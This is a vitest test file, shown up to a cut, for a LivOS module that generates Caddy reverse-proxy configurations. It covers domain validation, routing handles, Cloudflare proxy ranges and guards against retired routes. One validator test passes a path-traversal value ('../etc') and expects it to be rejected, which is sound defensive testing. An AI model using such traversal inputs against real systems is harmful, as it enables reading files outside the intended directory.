// livos/packages/livinityd/source/modules/domain/caddy.test.ts
// Phase 104 plan 104-03 — generateLocalCaddyfile + cloud-mode regression.
// Phase 104 plan 104-04 — append: generate{Hybrid,Portal}Caddyfile +
// validate{Hybrid,Portal}Domain + D-104-RELAY-ZERO-DATA-PLANE negative-grep.
// Phase 142-01 — local-lan generator dropped (generateLocalCaddyfile +
// validateLocalTld). Phase 143-03 — Hybrid* names renamed → Portal*; the
// legacy aliases (validateHybridDomain, generateHybridCaddyfile) are still
// exported and exercised below as a back-compat guarantee.
import {describe, it, test, expect} from 'vitest'
import {
	generateFullCaddyfile,
	generateHybridCaddyfile,
	generatePortalCaddyfile,
	validateHybridDomain,
	validatePortalDomain,
	validateHost,
} from './caddy.js'

// Phase 203 retirement (Plan 231-01) — the following describe blocks
// were removed:
//   - Phase 203-05 handshake handle (5 tests)
//   - Phase 203-09 Liv AI surface split (3 tests)
//   - Phase 203-10/12/Hot-fix-C gateway URL rewrite (4 tests)
//   - Phase 203 Hot-fix D operator-facing URL rename (5 tests)
// Liv Assistant (Phase 226-04 + Phase 227) is the v42 chat surface;
// the legacy Liv AI chat routing is no longer emitted by caddy.ts.
// Phase 231 negative-grep guard describe lives at the end of this file.

describe('generateFullCaddyfile — cloud-mode regression (D-104-NO-PROD-IMPACT)', () => {
	it('does NOT emit any pki or import directive in cloud mode (AC-104-3 unit-level)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).not.toContain('import /etc/caddy/pki-global.conf')
		expect(out).not.toContain('pki {')
		expect(out).not.toContain('ca liv-local')
		expect(out).not.toContain('issuer internal')
	})

	it('cloud-mode multiUser also has no pki directives', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			true,
			false,
			[],
		)
		expect(out).not.toContain('import /etc/caddy/pki-global.conf')
		expect(out).not.toContain('ca liv-local')
	})
})

// ─── Phase 104 plan 104-04 — hybrid mode tests ──────────────────────────

describe('validateHybridDomain (Phase 104 plan 104-04)', () => {
	it('accepts LivOS-provisioned home.livinity.io subdomains', () => {
		expect(validateHybridDomain('ab12cd34.home.livinity.io')).toBe(true)
		expect(validateHybridDomain('home.livinity.io')).toBe(true)
	})
	it('accepts user-owned domains', () => {
		expect(validateHybridDomain('home.bruceoz.com')).toBe(true)
	})
	it('rejects .local TLDs (route to local-lan instead)', () => {
		expect(validateHybridDomain('bruce.livinity.local')).toBe(false)
	})
	it('rejects IP-shaped strings and traversal patterns', () => {
		expect(validateHybridDomain('192.168.1.1')).toBe(false)
		expect(validateHybridDomain('../etc')).toBe(false)
	})
	it('rejects empty / too long inputs', () => {
		expect(validateHybridDomain('')).toBe(false)
		expect(validateHybridDomain('a'.repeat(254))).toBe(false)
	})
})

describe('generateHybridCaddyfile (Phase 104 plan 104-04)', () => {
	it('contains wildcard block with Cloudflare DNS-01 directive', () => {
		const out = generateHybridCaddyfile('ab12cd34.home.livinity.io')
		expect(out).toContain('*.ab12cd34.home.livinity.io {')
		expect(out).toContain('dns cloudflare {env.CLOUDFLARE_API_TOKEN}')
	})
	it('contains bare apex block', () => {
		const out = generateHybridCaddyfile('ab12cd34.home.livinity.io')
		expect(out).toMatch(/(^|\n)ab12cd34\.home\.livinity\.io \{/)
	})
	it('does NOT emit any pki or internal-CA directive', () => {
		const out = generateHybridCaddyfile('ab12cd34.home.livinity.io')
		expect(out).not.toContain('import /etc/caddy/pki-global.conf')
		expect(out).not.toContain('pki {')
		expect(out).not.toContain('ca liv-local')
		expect(out).not.toContain('issuer internal')
	})
	it('emits multi-user subdomains with the cloudflare DNS directive', () => {
		const out = generateHybridCaddyfile(
			'ab12cd34.home.livinity.io',
			[{name: 'app1', port: 8081}],
			true,
		)
		expect(out).toContain('app1.ab12cd34.home.livinity.io {')
		expect(out).toContain('reverse_proxy 127.0.0.1:8081')
		// app1 block must also have the cloudflare TLS directive
		const app1Idx = out.indexOf('app1.ab12cd34.home.livinity.io {')
		const app1End = out.indexOf('}', app1Idx)
		const app1Block = out.slice(app1Idx, app1End)
		expect(app1Block).toContain('dns cloudflare')
	})
	it('reverse_proxy lines all target 127.0.0.1 (LAN-direct data plane)', () => {
		const out = generateHybridCaddyfile(
			'ab12cd34.home.livinity.io',
			[{name: 'app1', port: 8081}],
			true,
		)
		// Every reverse_proxy line MUST point at 127.0.0.1:* — proves data-plane
		// stays LAN-direct (no Server5 / cloud relay leak at the generator level).
		const reverseLines = out.split('\n').filter((l) => l.includes('reverse_proxy'))
		expect(reverseLines.length).toBeGreaterThan(0)
		for (const line of reverseLines) {
			expect(line).toMatch(/reverse_proxy 127\.0\.0\.1:\d+/)
		}
	})
})

describe('generateFullCaddyfile — also has no cloudflare DNS-01 in cloud mode', () => {
	it('cloud-mode output has no `dns cloudflare {env...}` directive (D-104-NO-PROD-IMPACT)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		// Hybrid uses Caddy v2 DNS-01 plugin syntax; cloud mode uses Cloudflare via
		// a different on-Mini-PC path. They must be disjoint at the Caddyfile level.
		expect(out).not.toContain('dns cloudflare {env.CLOUDFLARE_API_TOKEN}')
	})
})

describe('generateHybridCaddyfile — data-plane invariant (D-104-RELAY-ZERO-DATA-PLANE)', () => {
	// Negative-grep test — static unit-test-level complement to the runtime
	// tcpdump assertion in plan 104-07. Proves at code-generation time that
	// the hybrid Caddyfile CANNOT route data-plane traffic via Server5 (or Server4).
	test('generateHybridCaddyfile output never references Server5 IP or routes data-plane via Server5', () => {
		// Object-arg cast preserves the contract literal from the verification
		// invariant (the generator's positional shape is exercised by the second
		// case below). Cast lets the static type check pass while the runtime
		// behavior collapses to "first positional argument is a string-coercible".
		const output = generateHybridCaddyfile(
			{hybridDomain: 'bruce.home.livinity.io', cfApiToken: 'fake-token-xxx'} as any,
		)
		expect(output).not.toMatch(/45\.137\.194\.102/)
		expect(output).not.toMatch(/reverse_proxy\s+[^\s]*livinity\.io[^\/\w]/)
		expect(output).not.toMatch(/45\.137\.194\.103/) // Server4 also off-limits
	})

	// Repeat with the canonical positional-arg call shape used by the generator
	// (the object-arg cast above is the contract literal from the verification
	// invariant; this second case exercises the real signature).
	test('generateHybridCaddyfile (positional signature) output never references Server5/Server4 IPs', () => {
		const output = generateHybridCaddyfile('bruce.home.livinity.io')
		expect(output).not.toMatch(/45\.137\.194\.102/) // Server5 IP
		expect(output).not.toMatch(/45\.137\.194\.103/) // Server4 IP (off-limits per memory)
		// No reverse_proxy line should point at any livinity.io hostname
		// (data-plane stays LAN-direct — reverse_proxy targets 127.0.0.1 only).
		expect(output).not.toMatch(/reverse_proxy\s+[^\s]*livinity\.io[^\/\w]/)
	})
})

// ─── Phase 142-01 — local-lan retirement guard ─────────────────────────

describe('Phase 142-01 local-lan retirement (source-text guards)', () => {
	test('caddy.ts no longer exports generateLocalCaddyfile / validateLocalTld', async () => {
		// Dynamic import so the test surfaces an early failure if either symbol
		// is re-introduced. Both should be `undefined` on the module object.
		const mod = (await import('./caddy.js')) as unknown as Record<string, unknown>
		expect(mod.generateLocalCaddyfile).toBeUndefined()
		expect(mod.validateLocalTld).toBeUndefined()
	})
})

// ─── Phase 143-03 — Hybrid → Portal alias back-compat guarantee ─────────

describe('Phase 143-03 Hybrid → Portal aliases (back-compat)', () => {
	test('generateHybridCaddyfile is the same function reference as generatePortalCaddyfile', () => {
		expect(generateHybridCaddyfile).toBe(generatePortalCaddyfile)
	})
	test('validateHybridDomain is the same function reference as validatePortalDomain', () => {
		expect(validateHybridDomain).toBe(validatePortalDomain)
	})
	test('aliases produce byte-identical output for the same input', () => {
		const portalOut = generatePortalCaddyfile('ab12cd34.home.livinity.io', [{name: 'app1', port: 9001}])
		const hybridOut = generateHybridCaddyfile('ab12cd34.home.livinity.io', [{name: 'app1', port: 9001}])
		expect(hybridOut).toBe(portalOut)
	})
})

// ─── Phase 141-03 — hyphen-pattern subdomain (canonical host) tests ──────

describe('validateHost (Phase 141-03)', () => {
	it('accepts Phase 140 hyphen-pattern hosts', () => {
		expect(validateHost('n8n-socinity.livinity.io')).toBe(true)
		expect(validateHost('code-server-lucy.livinity.io')).toBe(true)
		expect(validateHost('apex-user.livinity.io')).toBe(true)
	})
	it('accepts plain two-label hosts', () => {
		expect(validateHost('example.com')).toBe(true)
		expect(validateHost('a.b')).toBe(true)
	})
	it('rejects empty / single-label', () => {
		expect(validateHost('')).toBe(false)
		expect(validateHost('justalabel')).toBe(false)
	})
	it('rejects labels starting or ending with dash', () => {
		expect(validateHost('-bad.livinity.io')).toBe(false)
		expect(validateHost('bad-.livinity.io')).toBe(false)
	})
	it('rejects underscores + special chars', () => {
		expect(validateHost('bad_label.livinity.io')).toBe(false)
		expect(validateHost('a.b/c')).toBe(false)
		expect(validateHost('a b.com')).toBe(false)
	})
	it('rejects 254+ char hosts (RFC 1035)', () => {
		expect(validateHost('a.' + 'b'.repeat(252))).toBe(false)
	})
})

describe('generateFullCaddyfile — Phase 141-03 host (canonical FQDN) preferred over subdomain compute', () => {
	it('subdomain with `host` field emits a block named EXACTLY by host', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'socinity.livinity.io',
				subdomains: [
					{
						subdomain: 'n8n',
						appId: 'n8n',
						port: 5678,
						enabled: true,
						host: 'n8n-socinity.livinity.io', // Phase 140 hyphen-pattern
					},
				],
			},
			false,
			true, // tunnel mode → http:// prefix
			[],
		)
		// Block MUST be the canonical Server5-minted host (not subdomain.mainDomain).
		expect(out).toContain('http://n8n-socinity.livinity.io {')
		// Buggy compute path MUST NOT appear.
		expect(out).not.toContain('http://n8n.socinity.livinity.io {')
		// Reverse proxy still targets the app's local port.
		expect(out).toContain('reverse_proxy 127.0.0.1:5678')
	})

	it('subdomain WITHOUT `host` field falls back to legacy ${sub}.${mainDomain}', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [
					{subdomain: 'legacy-app', appId: 'legacy', port: 3000, enabled: true},
				],
			},
			false,
			false, // cloud mode → no prefix
			[],
		)
		// Legacy compute path kicks in for pre-Phase-140 entries.
		expect(out).toContain('legacy-app.bruce.livinity.io {')
	})

	it('mixed Phase 140 + legacy entries coexist (backwards-compat)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'socinity.livinity.io',
				subdomains: [
					{subdomain: 'n8n', appId: 'n8n', port: 5678, enabled: true, host: 'n8n-socinity.livinity.io'},
					{subdomain: 'old', appId: 'old', port: 4000, enabled: true},
				],
			},
			false,
			true,
			[],
		)
		expect(out).toContain('http://n8n-socinity.livinity.io {')
		expect(out).toContain('http://old.socinity.livinity.io {')
	})

	it('disabled subdomain is skipped even when `host` is set', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'socinity.livinity.io',
				subdomains: [
					{subdomain: 'n8n', appId: 'n8n', port: 5678, enabled: false, host: 'n8n-socinity.livinity.io'},
				],
			},
			false,
			true,
			[],
		)
		expect(out).not.toContain('n8n-socinity.livinity.io')
	})

	it('invalid `host` (single label) is skipped to keep Caddyfile valid', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'socinity.livinity.io',
				subdomains: [
					{subdomain: 'n8n', appId: 'n8n', port: 5678, enabled: true, host: 'malformed'},
				],
			},
			false,
			true,
			[],
		)
		// The bad host did not emit; neither did the legacy fallback (we trust
		// `host` once it's present — falling back would mask Server5 contract bugs).
		expect(out).not.toContain('malformed')
		expect(out).not.toContain('n8n.socinity.livinity.io')
	})

	it('multi-user mode with `host`: routes via livinityd gateway port', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'socinity.livinity.io',
				subdomains: [
					{subdomain: 'n8n', appId: 'n8n', port: 5678, enabled: true, host: 'n8n-socinity.livinity.io'},
				],
			},
			true, // multiUser
			true,
			[],
		)
		expect(out).toContain('http://n8n-socinity.livinity.io {')
		// In multi-user mode every block routes to livinityd's gateway (8080),
		// regardless of the app's local port.
		expect(out).toContain('reverse_proxy 127.0.0.1:8080')
		expect(out).not.toContain('reverse_proxy 127.0.0.1:5678')
	})
})

describe('Phase 219 hotfix — CF trusted_proxies global block (universal CF proxy resilience)', () => {
	it('emits Cloudflare IPv4 + IPv6 ranges as trusted_proxies at file start', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [],
			},
			false,
			false,
			[],
		)
		// Must begin with the global block — global options can't appear after a site block.
		expect(out.startsWith('{')).toBe(true)
		expect(out).toContain('trusted_proxies static')
		expect(out).toContain('173.245.48.0/20') // CF v4
		expect(out).toContain('104.16.0.0/13') // CF v4
		expect(out).toContain('2400:cb00::/32') // CF v6
		expect(out).toContain('client_ip_headers CF-Connecting-IP')
	})

	it('portal Caddyfile also carries the CF trusted_proxies block', () => {
		const out = generatePortalCaddyfile('socinity.livinity.io', [])
		expect(out.startsWith('{')).toBe(true)
		expect(out).toContain('trusted_proxies static')
		expect(out).toContain('162.158.0.0/15')
	})

	it('no-domain fallback still ships the CF block (consistency)', () => {
		const out = generateFullCaddyfile({mainDomain: null, subdomains: []}, false, false, [])
		expect(out).toContain('trusted_proxies static')
	})

	it('default IP-only Caddyfile ships the CF block too', async () => {
		const {generateDefaultCaddyfile} = await import('./caddy.js')
		const out = generateDefaultCaddyfile()
		expect(out).toContain('trusted_proxies static')
		expect(out).toContain(':80 {')
	})

	it('site blocks still come AFTER the global block (Caddy parses top-down)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [{subdomain: 'files', appId: 'filebrowser', port: 8070, enabled: true, host: 'files-bruce.livinity.io'}],
			},
			false,
			false,
			[],
		)
		const globalEndIdx = out.indexOf('}\n')
		const firstSiteIdx = out.indexOf('bruce.livinity.io {')
		expect(globalEndIdx).toBeGreaterThan(-1)
		expect(firstSiteIdx).toBeGreaterThan(globalEndIdx)
	})
})

// ─── Phase 226-04 — /liv reverse-proxy handle (regen-survivable) ────────
// Recovery from Plan 226-03 BLOCKED — emission moved from
// caddy/conf.d/liv-assistant.caddy (snippet, doomed by livinityd regen)
// into the generateFullCaddyfile() emitter so every reloadCaddy() rewrite
// preserves the /liv handler. Asserts the handler appears in apex + multi-user
// subdomain + null-mainDomain blocks, strips upstream X-Frame-Options + CSP,
// sets frame-ancestors CSP at handle scope, and lives ABOVE the catch-all
// :8080 handle so first-match-wins routes /liv* to :3020.

describe('Phase 226-04 — /liv reverse-proxy handle (regen-survivable)', () => {
	it('apex bruce.livinity.io block emits @liv path matcher + handle + uri strip_prefix /liv', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('@liv path /liv /liv/*')
		expect(out).toContain('handle @liv {')
		expect(out).toContain('uri strip_prefix /liv')
	})

	it('apex /liv handle reverse-proxies to 127.0.0.1:3020 (liv-assistant)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const livIdx = out.indexOf('@liv path /liv /liv/*')
		const blockTail = out.slice(livIdx)
		expect(blockTail).toContain('reverse_proxy 127.0.0.1:3020')
	})

	it('apex /liv handle strips upstream X-Frame-Options AND Content-Security-Policy', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const livIdx = out.indexOf('@liv path /liv /liv/*')
		const blockTail = out.slice(livIdx)
		expect(blockTail).toContain('header_down -X-Frame-Options')
		expect(blockTail).toContain('header_down -Content-Security-Policy')
	})

	it('apex /liv handle sets frame-ancestors CSP at handle scope', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain(
			"header Content-Security-Policy \"frame-ancestors 'self' https://bruce.livinity.io\"",
		)
	})

	it('apex /liv handle appears BEFORE the catch-all handle to :8080 (first-match-wins)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const apexBlockStart = out.indexOf('bruce.livinity.io {')
		expect(apexBlockStart).toBeGreaterThan(-1)
		const livIdx = out.indexOf('@liv path /liv /liv/*', apexBlockStart)
		// Match the catch-all `\thandle {\n\t\treverse_proxy 127.0.0.1:8080` pattern
		// (bare `handle {` with no matcher). Post Phase 231 retirement this is the
		// ONLY :8080 reverse-proxy in the apex block — the legacy handshake handle
		// at the same upstream was removed by Plan 231-01.
		const catchAllIdx = out.indexOf('\thandle {\n\t\treverse_proxy 127.0.0.1:8080', apexBlockStart)
		expect(livIdx).toBeGreaterThan(-1)
		expect(catchAllIdx).toBeGreaterThan(-1)
		expect(livIdx).toBeLessThan(catchAllIdx)
	})

	it('multi-user subdomain block (bruce.livinity.io) also emits /liv handle', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			},
			true, // multiUser
			false,
			[],
		)
		// In multi-user mode, the subdomain block is the one that routes to :8080
		// via the app gateway — it MUST emit /liv too so iframe access works for
		// every user, not just the operator on the apex.
		const subBlockStart = out.indexOf('bruce.livinity.io {')
		expect(subBlockStart).toBeGreaterThan(-1)
		const livIdx = out.indexOf('@liv path /liv /liv/*', subBlockStart)
		// Match the catch-all `\thandle {\n\t\treverse_proxy 127.0.0.1:8080` pattern
		// (post Phase 231 retirement, only :8080 reverse-proxy in the subdomain block).
		const catchAllIdx = out.indexOf('\thandle {\n\t\treverse_proxy 127.0.0.1:8080', subBlockStart)
		expect(livIdx).toBeGreaterThan(subBlockStart)
		expect(catchAllIdx).toBeGreaterThan(subBlockStart)
		expect(livIdx).toBeLessThan(catchAllIdx)
	})

	it('null mainDomain :80 fallback block also emits /liv handle (dev/IP-only operator)', () => {
		const out = generateFullCaddyfile({mainDomain: null, subdomains: []}, false, false, [])
		expect(out).toContain('@liv path /liv /liv/*')
		expect(out).toContain('reverse_proxy 127.0.0.1:3020')
	})

	it('tunnel-mode apex block keeps http:// prefix AND emits /liv (CF tunnel compatibility)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			true, // tunnel mode — Phase 134+ http:// prefix
			[],
		)
		expect(out).toContain('http://bruce.livinity.io {')
		const apexBlockStart = out.indexOf('http://bruce.livinity.io {')
		const livIdx = out.indexOf('@liv path /liv /liv/*', apexBlockStart)
		expect(livIdx).toBeGreaterThan(apexBlockStart)
	})

	it('/liv handle does NOT emit header_up Connection / Upgrade (preserves Caddy v2 WS auto-upgrade)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const livIdx = out.indexOf('@liv path /liv /liv/*')
		// Find the closing brace of the /liv handle block — search for the next
		// matcher-prefix or the catch-all handle, whichever comes first.
		const catchAllIdx = out.indexOf('handle {', livIdx)
		const livHandleBlock = out.slice(livIdx, catchAllIdx)
		expect(livHandleBlock).not.toContain('header_up Connection')
		expect(livHandleBlock).not.toContain('header_up Upgrade')
	})
})

// ─── Phase 232 — Livinity brand overlay (static /liv/branding handler only) ───
// New LIV_BRANDING_HANDLE constant serves /etc/liv-assistant/branding/* as
// static files at /liv/branding/*. Emitted in all 3 site blocks (fallback :80 +
// apex + multi-user subdomain).
//
// HISTORY: Plan 232-01 originally also patched LIV_ASSISTANT_HANDLE with a
// `replace "</head>" "<link rel=stylesheet href=/liv/branding/livinity-overlay.css>"`
// directive to inject the overlay CSS link tag into upstream HTML responses.
// Plan 232-02 deploy verification discovered the Mini PC's Caddy v2.11.3 binary
// does NOT ship the `caddyserver/replace-response` module — caddy validate
// rejected the directive with "unrecognized directive: replace". The replace
// directive was REVERTED in caddy.ts to restore Caddy reload health. HTML
// injection is deferred to a follow-up phase that rebuilds Caddy via xcaddy
// with the caddyserver/replace-response plugin.
//
// Tests below assert ONLY the static handler shape — the directive was removed.

describe('Phase 232 — Livinity brand overlay (/liv/branding static handler)', () => {
	it('apex block emits handle /liv/branding/* with root + file_server + strip_prefix', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('handle /liv/branding/*')
		expect(out).toContain('root * /etc/liv-assistant/branding')
		expect(out).toContain('file_server')
		expect(out).toContain('uri strip_prefix /liv/branding')
	})

	it('apex block does NOT emit replace directive (Caddy v2.11.3 lacks replace-response module)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		// Plan 232-02 hot-fix: replace directive REMOVED. Caddy v2.11.3 standard
		// distribution does NOT include caddyserver/replace-response. Including
		// the directive caused silent reload failure. Verification: Caddyfile
		// MUST NOT contain the directive.
		expect(out).not.toContain('replace "</head>"')
	})

	it('apex block — branding handle appears BEFORE @liv handle (specificity-safe ordering)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const apexStart = out.indexOf('bruce.livinity.io {')
		expect(apexStart).toBeGreaterThan(-1)
		const brandingIdx = out.indexOf('handle /liv/branding/*', apexStart)
		const livIdx = out.indexOf('@liv path /liv /liv/*', apexStart)
		expect(brandingIdx).toBeGreaterThan(-1)
		expect(livIdx).toBeGreaterThan(-1)
		expect(brandingIdx).toBeLessThan(livIdx)
	})

	it('multi-user subdomain block also emits branding handle', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			},
			true,
			false,
			[],
		)
		const subStart = out.indexOf('bruce.livinity.io {')
		expect(subStart).toBeGreaterThan(-1)
		const brandingIdx = out.indexOf('handle /liv/branding/*', subStart)
		expect(brandingIdx).toBeGreaterThan(subStart)
	})

	it('null mainDomain :80 fallback block also emits branding handle', () => {
		const out = generateFullCaddyfile({mainDomain: null, subdomains: []}, false, false, [])
		expect(out).toContain('handle /liv/branding/*')
		expect(out).toContain('root * /etc/liv-assistant/branding')
	})

	it('branding handle strips /liv/branding (NOT /liv) — basename reaches file_server', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const brandingIdx = out.indexOf('handle /liv/branding/*')
		expect(brandingIdx).toBeGreaterThan(-1)
		const tail = out.slice(brandingIdx, brandingIdx + 200)
		expect(tail).toContain('uri strip_prefix /liv/branding')
	})

	it('Phase 226-04 invariants STILL hold post-232: @liv → :3020 + XFO/CSP strip + frame-ancestors CSP', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('reverse_proxy 127.0.0.1:3020')
		expect(out).toContain('header_down -X-Frame-Options')
		expect(out).toContain('header_down -Content-Security-Policy')
		expect(out).toContain("frame-ancestors 'self' https://bruce.livinity.io")
	})

	it('tunnel-mode apex block also emits branding handle (CF tunnel non-regression)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			true, // tunnel mode — http:// prefix
			[],
		)
		expect(out).toContain('http://bruce.livinity.io {')
		const apexStart = out.indexOf('http://bruce.livinity.io {')
		const brandingIdx = out.indexOf('handle /liv/branding/*', apexStart)
		expect(brandingIdx).toBeGreaterThan(apexStart)
	})

	it('LIV_BRANDING_HANDLE emits in exactly 3 site blocks (fallback + apex + multi-user)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			},
			true,
			false,
			[],
		)
		// Apex + multi-user subdomain
		const matches = out.match(/handle \/liv\/branding\/\*/g) || []
		expect(matches.length).toBeGreaterThanOrEqual(2)
	})
})

// ─── Phase 231 retirement — OpenClawOS handles excised (negative-grep) ───
//
// Plan 231-01 removed OPENCLAWOS_HANDSHAKE_HANDLE + @livAiLivAi + @livAiOpenclawos
// + @openclawosPluginAssets handles from caddy.ts. The describe below locks
// in the excision against accidental reintroduction by a future regen of the
// LIV_AI_APP_HANDLE constant.

describe('Phase 231 — OpenClawOS handles excised', () => {
	const fixtures = [
		{name: 'null mainDomain :80 block', config: {mainDomain: null, subdomains: []} as const, multiUser: false},
		{name: 'apex with mainDomain', config: {mainDomain: 'bruce.livinity.io', subdomains: []} as const, multiUser: false},
		{
			name: 'multi-user subdomain block',
			config: {
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			} as const,
			multiUser: true,
		},
	]

	for (const fixture of fixtures) {
		it(`${fixture.name} contains zero legacy openclaw chat-surface references`, () => {
			const out = generateFullCaddyfile(fixture.config, fixture.multiUser, false, [])
			expect(out).not.toContain('/openclawos/handshake')
			expect(out).not.toContain('@livAiOpenclawos')
			expect(out).not.toContain('@openclawosPluginAssets')
			expect(out).not.toContain('@livAiLivAi')
			expect(out).not.toContain('/plugins/openclawos')
			expect(out).not.toContain('/liv-ai-app/openclawos')
		})

		it(`${fixture.name} contains zero :18789 reverse_proxy targets`, () => {
			const out = generateFullCaddyfile(fixture.config, fixture.multiUser, false, [])
			expect(out).not.toContain('127.0.0.1:18789')
		})
	}
})

// ─── Phase 237 — split subresource matcher: @liv_ws + @liv_api_subresource ───
//
// SUPERSEDES Phase 236's combined `@liv_subresource` matcher.
//
// Phase 236 used a single `@liv_subresource` matcher that ANDed
// `header_regexp Referer ^https?://[^/]+/liv(/|$)` AND
// `path /api/* /ws /ws/*`. Per RFC 6455 the browser does NOT send a
// `Referer` header on the WebSocket upgrade handshake — only `Origin`.
// The combined matcher silently missed the `wss://.../ws` upgrade →
// fell through to the `:8080` catch-all (no `/ws` route) → 404/502 →
// chat streaming broken (operator had to reload the page per response).
//
// Phase 237 splits into:
//   - `@liv_ws path /ws /ws/*` — UNCONDITIONAL (no header check). AionUi
//     exclusively owns `/ws` on this Caddy host; livinityd has no `/ws`
//     route. Safe + consistent.
//   - `@liv_api_subresource { header_regexp Referer ...; path /api/* }`
//     — KEEP referer-gate for `/api/*` only. Preserves Phase 236's
//     protection of LivOS-shell apex `/api/*` from collateral routing
//     to AionUi (shell Referer = `/` or `/app-store`, never `/liv/`).
//
// Tests assert: BOTH matcher block emissions, regex literal on the API
// matcher only, path token list on each matcher, reverse_proxy target,
// header strip pair, frame-ancestors CSP on API handle, absence of the
// old `@liv_subresource` combined matcher, source ordering above @liv
// path, presence in all 3 site blocks, Phase 226-04 non-regression.

describe('Phase 237 — split subresource matchers (@liv_ws + @liv_api_subresource)', () => {
	it('apex block emits @liv_ws path matcher with /ws + /ws/* tokens', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('@liv_ws path /ws /ws/*')
		expect(out).toContain('handle @liv_ws {')
	})

	it('apex @liv_ws matcher does NOT contain header_regexp Referer (WS handshake has no Referer per RFC 6455)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const wsIdx = out.indexOf('@liv_ws path /ws /ws/*')
		expect(wsIdx).toBeGreaterThan(-1)
		// Slice forward through the @liv_ws handle body (stop at the next matcher).
		const nextApiIdx = out.indexOf('@liv_api_subresource', wsIdx)
		expect(nextApiIdx).toBeGreaterThan(wsIdx)
		const wsBlock = out.slice(wsIdx, nextApiIdx)
		expect(wsBlock).not.toContain('header_regexp Referer')
	})

	it('apex @liv_ws handle reverse-proxies to 127.0.0.1:3020 (liv-assistant)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const idx = out.indexOf('handle @liv_ws {')
		expect(idx).toBeGreaterThan(-1)
		const blockTail = out.slice(idx, idx + 400)
		expect(blockTail).toContain('reverse_proxy 127.0.0.1:3020')
		expect(blockTail).toContain('header_down -X-Frame-Options')
		expect(blockTail).toContain('header_down -Content-Security-Policy')
	})

	// Phase 245.6 — /ws/stream/* carve-out for livinityd's WebApp RFB streaming
	// endpoint. Must be emitted BEFORE @liv_ws so the broader /ws /ws/* matcher
	// doesn't claim /ws/stream/* and silently send it to :3020 (where it 404s).
	it('apex block emits @webapp_stream_ws BEFORE @liv_ws (route precedence)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const streamIdx = out.indexOf('@webapp_stream_ws path /ws/stream/*')
		const livWsIdx = out.indexOf('@liv_ws path /ws /ws/*')
		expect(streamIdx).toBeGreaterThan(-1)
		expect(livWsIdx).toBeGreaterThan(-1)
		expect(streamIdx).toBeLessThan(livWsIdx)
	})

	it('apex @webapp_stream_ws handle reverse-proxies to 127.0.0.1:8080 (livinityd)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const idx = out.indexOf('handle @webapp_stream_ws {')
		expect(idx).toBeGreaterThan(-1)
		const blockTail = out.slice(idx, idx + 300)
		expect(blockTail).toContain('reverse_proxy 127.0.0.1:8080')
	})

	it('apex block emits @liv_api_subresource block-style matcher with header_regexp + path /api/* (no /ws)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('@liv_api_subresource {')
		expect(out).toContain('header_regexp Referer ^https?://[^/]+/liv(/|$)')
